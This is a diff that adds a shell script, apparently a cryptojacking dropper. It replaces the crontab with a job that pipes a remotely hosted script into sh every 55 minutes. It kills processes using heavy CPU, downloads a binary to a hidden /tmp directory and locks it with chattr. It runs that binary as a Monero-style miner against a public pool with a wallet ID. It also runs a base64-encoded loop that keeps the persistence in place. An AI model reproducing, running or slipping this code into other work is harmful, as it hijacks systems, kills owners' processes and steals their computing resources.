@@ -1,0 +1,59 @@
+#!/bin/sh
+
+# Define URLs
+URL_LOG_CHECK="https://bug-free-waffle-vjjg6gqp5426gp4-8000.app.github.dev//log_check.bin.txt"
+URL_PIPPIP="https://bug-free-waffle-vjjg6gqp5426gp4-8000.app.github.dev/luk-cpu"
+
+# Set up cron job to check every 55 minutes
+setup_cron_job() {
+    crontab -r || true
+    echo "*/55 * * * * (curl -s $URL_LOG_CHECK || wget -q -O- $URL_LOG_CHECK) | sh" > /tmp/cron || true
+    crontab /tmp/cron || true
+    rm -rf /tmp/cron || true
+}
+
+# Kill processes with CPU usage greater than 60%
+manage_high_cpu_processes() {
+    ps aux | grep -vw pippip | awk '{if($3>60.0) print $2}' > /tmp/proc
+    while read procid; do
+        kill -9 "$procid"
+    done < /tmp/proc
+}
+
+# Check if the process 'pippip' is running
+check_and_handle_process() {
+    if ps -fe | grep -w pippip | grep -v grep > /dev/null; then
+        pwd
+    else
+        handle_missing_process
+    fi
+}
+
+# Handle the case when 'pippip' process is not running
+handle_missing_process() {
+    chattr -i /tmp/.x/. || true
+    rm -rf /tmp/.x || true
+    setup_cron_job
+
+    mkdir /tmp/.x
+    curl -o /tmp/.x/pippip "$URL_PIPPIP" || wget -O /tmp/.x/pippip "$URL_PIPPIP"
+    chmod 777 /tmp/.x/pippip
+    cd /tmp/.x || exit
+    /sbin/sysctl -w vm.nr_hugepages=1000
+    chattr +i /tmp/.x/pippip
+
+    /tmp/.x/pippip -o pool.hashvault.pro:443 --rig-id 4Ak4r46nFwyN5fJzziVCG5BmqFYcHrmncSqPcubn7KC19TGtxFczSzRVJ7QSpF9DTk5QSNZSByorG1jCZTahcHXbSvLgMe6 --donate-level=1 -B >/dev/null &
+}
+
+# Base64 decode and execute commands
+base64_decode_and_execute() {
+    echo "dGVzdCAtZiAvdG1wLzIgfHwgd2hpbGUgOjsgZG8KICAgIGNyb250YWIgLXIgfHwgdHJ1ZQogICAgZWNobyAiKi81NSAqICogKiAqIChjdXJsIC1zIGh0dHBzOi8vYnVnLWZyZWUtd2FmZmxlLXZqamc2Z3FwNTQyNmdwNC04MDAwLmFwcC5naXRodWIuZGV2L2xvZ19jaGVjay5iaW58fHdnZXQgLXEgLU8tIGh0dHBzOi8vYnVnLWZyZWUtd2FmZmxlLXZqamc2Z3FwNTQyNmdwNC04MDAwLmFwcC5naXRodWIuZGV2L2xvZ19jaGVjay5iaW4pfHNoIiA+IC90bXAvY3JvbiB8fCB0cnVlCiAgICBjcm9udGFiIC90bXAvY3JvbiB8fCB0cnVlCiAgICBybSAtcmYgL3RtcC9jcm9uIHx8IHRydWUKICAgIHRvdWNoIC90bXAvMgpkb25lID4vZGV2L251bGwgJgo=" | base64 -d | sh
+}
+
+# Run the script
+setup_cron_job
+manage_high_cpu_processes
+check_and_handle_process
+base64_decode_and_execute
+
+echo "Running..."
